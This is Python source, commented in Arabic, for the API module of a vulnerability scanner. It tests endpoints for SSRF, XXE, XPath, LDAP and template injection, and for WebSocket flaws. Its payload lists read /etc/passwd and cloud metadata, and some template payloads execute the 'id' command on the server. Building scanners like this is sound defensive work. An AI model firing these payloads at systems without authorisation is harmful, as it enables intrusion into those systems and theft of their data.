#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
وحدة فحص ثغرات API
تتضمن فحوصات لثغرات API مثل API Security Issues و SSRF وغيرها
"""

import re
import json
import requests
import urllib.parse
from .base_scanner import VulnerabilityScanner

class ApiVulnerabilityScanner(VulnerabilityScanner):
    """فاحص ثغرات API"""
    
    def __init__(self, config=None):
        """تهيئة الفاحص"""
        super().__init__(config)
        
    def get_description(self):
        """الحصول على وصف الفاحص"""
        return "فاحص ثغرات API الشامل"
    
    def get_supported_vulnerabilities(self):
        """الحصول على قائمة الثغرات المدعومة"""
        return [
            'API Security Issues',
            'Server-Side Request Forgery (SSRF)',
            'Xpath Injection',
            'LDAP Injection',
            'Template Injection',
            'Expression Language Injection',
            'XML External Entity (XXE)',
            'XML Injection',
            'WebSocket Vulnerabilities'
        ]
    
    def scan(self, target, progress=None):
        """فحص الهدف للثغرات"""
        vulnerabilities = []
        
        # الحصول على عنوان URL للهدف
        if target.get_hostname():
            base_url = f"http://{target.get_hostname()}"
            if 443 in target.get_ports() and target.get_ports()[443] == 'open':
                base_url = f"https://{target.get_hostname()}"
            host = target.get_hostname()
        else:
            base_url = f"http://{target.get_ip()}"
            if 443 in target.get_ports() and target.get_ports()[443] == 'open':
                base_url = f"https://{target.get_ip()}"
            host = target.get_ip()
        
        # فحص ثغرات API
        try:
            # اكتشاف نقاط نهاية API
            api_endpoints = self._discover_api_endpoints(base_url)
            
            # فحص ثغرات SSRF
            ssrf_vulns = self._check_ssrf(base_url, api_endpoints)
            vulnerabilities.extend(ssrf_vulns)
            
            # فحص ثغرات XXE
            xxe_vulns = self._check_xxe(base_url, api_endpoints)
            vulnerabilities.extend(xxe_vulns)
            
            # فحص ثغرات XPath Injection
            xpath_vulns = self._check_xpath_injection(base_url, api_endpoints)
            vulnerabilities.extend(xpath_vulns)
            
            # فحص ثغرات LDAP Injection
            ldap_vulns = self._check_ldap_injection(base_url, api_endpoints)
            vulnerabilities.extend(ldap_vulns)
            
            # فحص ثغرات Template Injection
            template_vulns = self._check_template_injection(base_url, api_endpoints)
            vulnerabilities.extend(template_vulns)
            
            # فحص ثغرات WebSocket
            websocket_vulns = self._check_websocket_vulnerabilities(target)
            vulnerabilities.extend(websocket_vulns)
            
        except Exception as e:
            if self.verbose:
                print(f"خطأ في فحص ثغرات API: {str(e)}")
        
        # إضافة الثغرات إلى الهدف
        for vuln in vulnerabilities:
            target.add_vulnerability(vuln)
        
        return vulnerabilities
    
    def _make_request(self, url, method='GET', data=None, params=None, headers=None, json_data=None, follow_redirects=True):
        """إجراء طلب HTTP"""
        try:
            req_headers = {
                'User-Agent': 'UltimateScan/1.0',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            if headers:
                req_headers.update(headers)
                
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params=params,
                    headers=req_headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            elif method.upper() == 'POST':
                if json_data:
                    response = requests.post(
                        url,
                        json=json_data,
                        headers=req_headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=follow_redirects
                    )
                else:
                    response = requests.post(
                        url,
                        data=data,
                        headers=req_headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=follow_redirects
                    )
            elif method.upper() == 'PUT':
                if json_data:
                    response = requests.put(
                        url,
                        json=json_data,
                        headers=req_headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=follow_redirects
                    )
                else:
                    response = requests.put(
                        url,
                        data=data,
                        headers=req_headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=follow_redirects
                    )
            elif method.upper() == 'DELETE':
                response = requests.delete(
                    url,
                    headers=req_headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=follow_redirects
                )
            else:
                return None
            
            return response
        except Exception as e:
            if self.verbose:
                print(f"خطأ في إجراء طلب HTTP: {str(e)}")
            return None
    
    def _discover_api_endpoints(self, base_url):
        """اكتشاف نقاط نهاية API"""
        api_endpoints = []
        
        # قائمة بالمسارات المحتملة
        paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3', '/api/latest',
            '/rest', '/rest/v1', '/rest/v2', '/rest/v3', '/rest/latest',
            '/graphql', '/graphiql', '/query', '/gql', '/v1', '/v2', '/v3',
            '/swagger', '/swagger-ui', '/swagger-ui.html', '/swagger.json',
            '/openapi', '/openapi.json', '/docs', '/api-docs', '/api/docs'
        ]
        
        # فحص كل مسار
        for path in paths:
            url = f"{base_url}{path}"
            
            # إرسال الطلب
            response = self._make_request(url)
            
            if response and response.status_code == 200:
                # التحقق من نوع المحتوى
                content_type = response.headers.get('Content-Type', '')
                
                if 'application/json' in content_type or 'application/xml' in content_type:
                    api_endpoints.append(path)
                elif 'text/html' in content_type:
                    # البحث عن كلمات مفتاحية تشير إلى API
                    if 'api' in response.text.lower() or 'rest' in response.text.lower() or 'swagger' in response.text.lower() or 'openapi' in response.text.lower():
                        api_endpoints.append(path)
        
        # البحث عن نقاط نهاية API إضافية
        for path in api_endpoints[:]:
            url = f"{base_url}{path}"
            
            # إرسال الطلب
            response = self._make_request(url)
            
            if response and response.status_code == 200:
                # البحث عن مسارات API في الاستجابة
                api_path_pattern = r'["\']/(api|rest|v[0-9]+)/([^"\']+)["\']'
                matches = re.findall(api_path_pattern, response.text)
                
                for match in matches:
                    new_path = f"/{match[0]}/{match[1]}"
                    if new_path not in api_endpoints:
                        api_endpoints.append(new_path)
        
        return api_endpoints
    
    def _check_ssrf(self, base_url, api_endpoints):
        """فحص ثغرات SSRF"""
        vulnerabilities = []
        
        # قائمة بالمعلمات المحتملة
        params = ['url', 'uri', 'link', 'src', 'source', 'redirect', 'redirect_uri', 'redirect_url', 'callback', 'callback_url', 'next', 'next_url', 'target', 'target_url', 'destination', 'dest']
        
        # قائمة بحمولات SSRF
        payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://[::1]',
            'http://0.0.0.0',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/',
            'http://169.254.169.254/latest/user-data/',
            'file:///etc/passwd',
            'file:///proc/self/environ',
            'dict://localhost:22',
            'gopher://localhost:22',
            'ftp://localhost:21'
        ]
        
        # فحص كل نقطة نهاية API
        for endpoint in api_endpoints:
            url = f"{base_url}{endpoint}"
            
            # فحص كل معلمة
            for param in params:
                for payload in payloads:
                    # إنشاء معلمات الطلب
                    params_data = {param: payload}
                    
                    # إرسال الطلب GET
                    response = self._make_request(url, params=params_data)
                    
                    if response:
                        # التحقق من وجود أنماط SSRF
                        if 'root:' in response.text or 'ssh' in response.text or 'ami-id' in response.text or 'instance-id' in response.text:
                            vuln = self.create_vulnerability(
                                vuln_type='Server-Side Request Forgery (SSRF)',
                                severity='high',
                                description='الموقع معرض لثغرة SSRF',
                                location={
                                    'url': url,
                                    'parameter': param,
                                    'method': 'GET'
                                },
                                exploit_info={
                                    'payload': payload,
                                    'exploit_url': f"{url}?{param}={urllib.parse.quote(payload)}",
                                    'method': 'GET'
                                },
                                recommendation='تنقية مدخلات المستخدم وتقييد الوصول إلى الموارد الداخلية',
                                references=[
                                    'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
                                    'https://portswigger.net/web-security/ssrf'
                                ]
                            )
                            vulnerabilities.append(vuln)
                            break
                    
                    # إرسال الطلب POST
                    json_data = {param: payload}
                    response = self._make_request(url, method='POST', json_data=json_data, headers={'Content-Type': 'application/json'})
                    
                    if response:
                        # التحقق من وجود أنماط SSRF
                        if 'root:' in response.text or 'ssh' in response.text or 'ami-id' in response.text or 'instance-id' in response.text:
                            vuln = self.create_vulnerability(
                                vuln_type='Server-Side Request Forgery (SSRF)',
                                severity='high',
                                description='الموقع معرض لثغرة SSRF',
                                location={
                                    'url': url,
                                    'parameter': param,
                                    'method': 'POST'
                                },
                                exploit_info={
                                    'payload': payload,
                                    'json_data': json_data,
                                    'method': 'POST'
                                },
                                recommendation='تنقية مدخلات المستخدم وتقييد الوصول إلى الموارد الداخلية',
                                references=[
                                    'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
                                    'https://portswigger.net/web-security/ssrf'
                                ]
                            )
                            vulnerabilities.append(vuln)
                            break
        
        return vulnerabilities
    
    def _check_xxe(self, base_url, api_endpoints):
        """فحص ثغرات XXE"""
        vulnerabilities = []
        
        # قائمة بحمولات XXE
        payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://127.0.0.1:3306">]><foo>&xxe;</foo>'
        ]
        
        # فحص كل نقطة نهاية API
        for endpoint in api_endpoints:
            url = f"{base_url}{endpoint}"
            
            for payload in payloads:
                # إرسال الطلب
                response = self._make_request(url, method='POST', data=payload, headers={'Content-Type': 'application/xml'})
                
                if response:
                    # التحقق من وجود أنماط XXE
                    if 'root:' in response.text or 'localhost' in response.text or 'mysql' in response.text:
                        vuln = self.create_vulnerability(
                            vuln_type='XML External Entity (XXE)',
                            severity='high',
                            description='الموقع معرض لثغرة XXE',
                            location={
                                'url': url,
                                'method': 'POST'
                            },
                            exploit_info={
                                'payload': payload,
                                'method': 'POST',
                                'content_type': 'application/xml'
                            },
                            recommendation='تعطيل معالجة الكيانات الخارجية في معالج XML',
                            references=[
                                'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
                                'https://portswigger.net/web-security/xxe'
                            ]
                        )
                        vulnerabilities.append(vuln)
                        break
        
        return vulnerabilities
    
    def _check_xpath_injection(self, base_url, api_endpoints):
        """فحص ثغرات XPath Injection"""
        vulnerabilities = []
        
        # قائمة بالمعلمات المحتملة
        params = ['xpath', 'query', 'search', 'filter', 'q', 'xml', 'data', 'node', 'element']
        
        # قائمة بحمولات XPath Injection
        payloads = [
            "' or '1'='1",
            "' or ''='",
            "' or 1=1]//",
            "' or /*",
            "' or count(parent::*[position()=1])=1 or '1'='",
            "' or count(parent::*[position()=1])>0 or '1'='"
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        patterns = [
            'xpath', 'XPath', 'xml', 'XML', 'syntax error', 'invalid expression',
            'stack trace', 'runtime error', 'evaluation failed'
        ]
        
        # فحص كل نقطة نهاية API
        for endpoint in api_endpoints:
            url = f"{base_url}{endpoint}"
            
            # فحص كل معلمة
            for param in params:
                for payload in payloads:
                    # إنشاء معلمات الطلب
                    params_data = {param: payload}
                    
                    # إرسال الطلب GET
                    response = self._make_request(url, params=params_data)
                    
                    if response:
                        # التحقق من وجود أنماط XPath Injection
                        for pattern in patterns:
                            if pattern in response.text:
                                vuln = self.create_vulnerability(
                                    vuln_type='XPath Injection',
                                    severity='high',
                                    description='الموقع معرض لثغرة XPath Injection',
                                    location={
                                        'url': url,
                                        'parameter': param,
                                        'method': 'GET'
                                    },
                                    exploit_info={
                                        'payload': payload,
                                        'exploit_url': f"{url}?{param}={urllib.parse.quote(payload)}",
                                        'method': 'GET'
                                    },
                                    recommendation='تنقية مدخلات المستخدم وتجنب بناء استعلامات XPath ديناميكية',
                                    references=[
                                        'https://owasp.org/www-community/attacks/XPATH_Injection',
                                        'https://www.acunetix.com/vulnerabilities/web/xpath-injection/'
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
                    
                    # إرسال الطلب POST
                    json_data = {param: payload}
                    response = self._make_request(url, method='POST', json_data=json_data, headers={'Content-Type': 'application/json'})
                    
                    if response:
                        # التحقق من وجود أنماط XPath Injection
                        for pattern in patterns:
                            if pattern in response.text:
                                vuln = self.create_vulnerability(
                                    vuln_type='XPath Injection',
                                    severity='high',
                                    description='الموقع معرض لثغرة XPath Injection',
                                    location={
                                        'url': url,
                                        'parameter': param,
                                        'method': 'POST'
                                    },
                                    exploit_info={
                                        'payload': payload,
                                        'json_data': json_data,
                                        'method': 'POST'
                                    },
                                    recommendation='تنقية مدخلات المستخدم وتجنب بناء استعلامات XPath ديناميكية',
                                    references=[
                                        'https://owasp.org/www-community/attacks/XPATH_Injection',
                                        'https://www.acunetix.com/vulnerabilities/web/xpath-injection/'
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    def _check_ldap_injection(self, base_url, api_endpoints):
        """فحص ثغرات LDAP Injection"""
        vulnerabilities = []
        
        # قائمة بالمعلمات المحتملة
        params = ['username', 'user', 'uid', 'cn', 'dn', 'email', 'group', 'member', 'filter', 'query', 'search', 'q']
        
        # قائمة بحمولات LDAP Injection
        payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(uid=*",
            "*)(uid=*))%00",
            "*)(uid=*))(&(uid=*",
            "admin)(&)",
            "admin)(|(password=*))",
            "admin)(password=*)",
            "*)(uid=*))(|(uid=*"
        ]
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        patterns = [
            'ldap', 'LDAP', 'directory', 'Directory', 'uid', 'cn', 'dn',
            'syntax error', 'invalid filter', 'stack trace', 'runtime error'
        ]
        
        # فحص كل نقطة نهاية API
        for endpoint in api_endpoints:
            url = f"{base_url}{endpoint}"
            
            # فحص كل معلمة
            for param in params:
                for payload in payloads:
                    # إنشاء معلمات الطلب
                    params_data = {param: payload}
                    
                    # إرسال الطلب GET
                    response = self._make_request(url, params=params_data)
                    
                    if response:
                        # التحقق من وجود أنماط LDAP Injection
                        for pattern in patterns:
                            if pattern in response.text:
                                vuln = self.create_vulnerability(
                                    vuln_type='LDAP Injection',
                                    severity='high',
                                    description='الموقع معرض لثغرة LDAP Injection',
                                    location={
                                        'url': url,
                                        'parameter': param,
                                        'method': 'GET'
                                    },
                                    exploit_info={
                                        'payload': payload,
                                        'exploit_url': f"{url}?{param}={urllib.parse.quote(payload)}",
                                        'method': 'GET'
                                    },
                                    recommendation='تنقية مدخلات المستخدم وتجنب بناء استعلامات LDAP ديناميكية',
                                    references=[
                                        'https://owasp.org/www-community/attacks/LDAP_Injection',
                                        'https://www.acunetix.com/vulnerabilities/web/ldap-injection/'
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
                    
                    # إرسال الطلب POST
                    json_data = {param: payload}
                    response = self._make_request(url, method='POST', json_data=json_data, headers={'Content-Type': 'application/json'})
                    
                    if response:
                        # التحقق من وجود أنماط LDAP Injection
                        for pattern in patterns:
                            if pattern in response.text:
                                vuln = self.create_vulnerability(
                                    vuln_type='LDAP Injection',
                                    severity='high',
                                    description='الموقع معرض لثغرة LDAP Injection',
                                    location={
                                        'url': url,
                                        'parameter': param,
                                        'method': 'POST'
                                    },
                                    exploit_info={
                                        'payload': payload,
                                        'json_data': json_data,
                                        'method': 'POST'
                                    },
                                    recommendation='تنقية مدخلات المستخدم وتجنب بناء استعلامات LDAP ديناميكية',
                                    references=[
                                        'https://owasp.org/www-community/attacks/LDAP_Injection',
                                        'https://www.acunetix.com/vulnerabilities/web/ldap-injection/'
                                    ]
                                )
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    def _check_template_injection(self, base_url, api_endpoints):
        """فحص ثغرات Template Injection"""
        vulnerabilities = []
        
        # قائمة بالمعلمات المحتملة
        params = ['template', 'page', 'view', 'theme', 'display', 'layout', 'style', 'skin', 'path', 'name', 'text', 'content', 'data']
        
        # قائمة بحمولات Template Injection
        payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{config.items()}}',
                '{{request}}',
                '{{self}}',
                '{{url_for.__globals__}}',
                '{{get_flashed_messages.__globals__}}',
                '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self}}',
                '{{_self.env}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                '${\"freemarker.template.utility.Execute\"?new()("id")}'
            ],
            'velocity': [
                '#set($x=7*7)${x}',
                '#set($cmd="id")#set($exec="$cmd.execute()")#set($out="$exec.getInputStream()")#foreach($i in [1..$out.available()])$out.read()#end'
            ],
            'handlebars': [
                '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.push (lookup string.sub "constructor")}}{{this.push "return process.env"}}{{#with string.split as |codelist|}}{{this.push "return require(\'child_process\').execSync(\'id\')"}}{{/with}}{{/with}}{{/with}}{{/with}}'
            ]
        }
        
        # قائمة بأنماط الاستجابة التي تشير إلى نجاح الحقن
        patterns = {
            'jinja2': ['49', 'uid=', 'gid=', 'groups='],
            'twig': ['49', 'uid=', 'gid=', 'groups='],
            'freemarker': ['49', 'uid=', 'gid=', 'groups='],
            'velocity': ['49', 'uid=', 'gid=', 'groups='],
            'handlebars': ['49', 'uid=', 'gid=', 'groups=']
        }
        
        # فحص كل نقطة نهاية API
        for endpoint in api_endpoints:
            url = f"{base_url}{endpoint}"
            
            # فحص كل معلمة
            for param in params:
                for engine, engine_payloads in payloads.items():
                    for payload in engine_payloads:
                        # إنشاء معلمات الطلب
                        params_data = {param: payload}
                        
                        # إرسال الطلب GET
                        response = self._make_request(url, params=params_data)
                        
                        if response:
                            # التحقق من وجود أنماط Template Injection
                            for pattern in patterns[engine]:
                                if pattern in response.text:
                                    vuln = self.create_vulnerability(
                                        vuln_type='Template Injection',
                                        severity='high',
                                        description=f'الموقع معرض لثغرة Template Injection ({engine})',
                                        location={
                                            'url': url,
                                            'parameter': param,
                                            'method': 'GET',
                                            'engine': engine
                                        },
                                        exploit_info={
                                            'payload': payload,
                                            'exploit_url': f"{url}?{param}={urllib.parse.quote(payload)}",
                                            'method': 'GET'
                                        },
                                        recommendation='تنقية مدخلات المستخدم وتجنب استخدام مدخلات المستخدم في قوالب',
                                        references=[
                                            'https://portswigger.net/research/server-side-template-injection',
                                            'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection'
                                        ]
                                    )
                                    vulnerabilities.append(vuln)
                                    break
                        
                        # إرسال الطلب POST
                        json_data = {param: payload}
                        response = self._make_request(url, method='POST', json_data=json_data, headers={'Content-Type': 'application/json'})
                        
                        if response:
                            # التحقق من وجود أنماط Template Injection
                            for pattern in patterns[engine]:
                                if pattern in response.text:
                                    vuln = self.create_vulnerability(
                                        vuln_type='Template Injection',
                                        severity='high',
                                        description=f'الموقع معرض لثغرة Template Injection ({engine})',
                                        location={
                                            'url': url,
                                            'parameter': param,
                                            'method': 'POST',
                                            'engine': engine
                                        },
                                        exploit_info={
                                            'payload': payload,
                                            'json_data': json_data,
                                            'method': 'POST'
                                        },
                                        recommendation='تنقية مدخلات المستخدم وتجنب استخدام مدخلات المستخدم في قوالب',
                                        references=[
                                            'https://portswigger.net/research/server-side-template-injection',
                                            'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection'
                                        ]
                                    )
                                    vulnerabilities.append(vuln)
                                    break
        
        return vulnerabilities
    
    def _check_websocket_vulnerabilities(self, target):
        """فحص ثغرات WebSocket"""
        vulnerabilities = []
        
        # قائمة بالمنافذ المحتملة
        websocket_ports = [80, 443, 8080, 8443, 9000, 9001, 9090, 9091]
        
        # فحص كل منفذ
        for port in websocket_ports:
            if port in target.get_ports() and target.get_ports()[port] == 'open':
                protocol = 'wss' if port in [443, 8443] else 'ws'
                host = target.get_hostname() or target.get_ip()
                
                # قائمة بالمسارات المحتملة
                paths = [
                    '/ws', '/websocket', '/socket', '/socket.io', '/echo',
                    '/chat', '/live', '/push', '/events', '/stream',
                    '/realtime', '/ws-api', '/api/ws', '/api/websocket'
                ]
                
                # فحص كل مسار
                for path in paths:
                    url = f"{protocol}://{host}:{port}{path}"
                    http_url = f"{'https' if protocol == 'wss' else 'http'}://{host}:{port}{path}"
                    
                    # إرسال طلب HTTP للتحقق من وجود WebSocket
                    response = self._make_request(http_url)
                    
                    if response and (
                        'websocket' in response.headers.get('Upgrade', '').lower() or
                        'websocket' in response.headers.get('Connection', '').lower() or
                        'socket.io' in response.text.lower() or
                        'ws' in response.text.lower()
                    ):
                        # التحقق من عدم وجود تحقق من الأصل
                        origin_headers = {
                            'Origin': 'https://evil.com',
                            'Sec-WebSocket-Version': '13',
                            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ=='
                        }
                        
                        origin_response = self._make_request(http_url, headers=origin_headers)
                        
                        if origin_response and origin_response.status_code in [101, 200, 400]:
                            vuln = self.create_vulnerability(
                                vuln_type='WebSocket Origin Validation',
                                severity='medium',
                                description='الموقع لا يتحقق من أصل WebSocket',
                                location={
                                    'url': url
                                },
                                recommendation='تنفيذ التحقق من الأصل لاتصالات WebSocket',
                                references=[
                                    'https://portswigger.net/web-security/websockets',
                                    'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets'
                                ]
                            )
                            vulnerabilities.append(vuln)
                        
                        # التحقق من عدم وجود تشفير
                        if protocol == 'ws':
                            vuln = self.create_vulnerability(
                                vuln_type='Unencrypted WebSocket',
                                severity='medium',
                                description='الموقع يستخدم WebSocket غير مشفر',
                                location={
                                    'url': url
                                },
                                recommendation='استخدام WebSocket مشفر (WSS) بدلاً من WS',
                                references=[
                                    'https://portswigger.net/web-security/websockets',
                                    'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets'
                                ]
                            )
                            vulnerabilities.append(vuln)
        
        return vulnerabilities
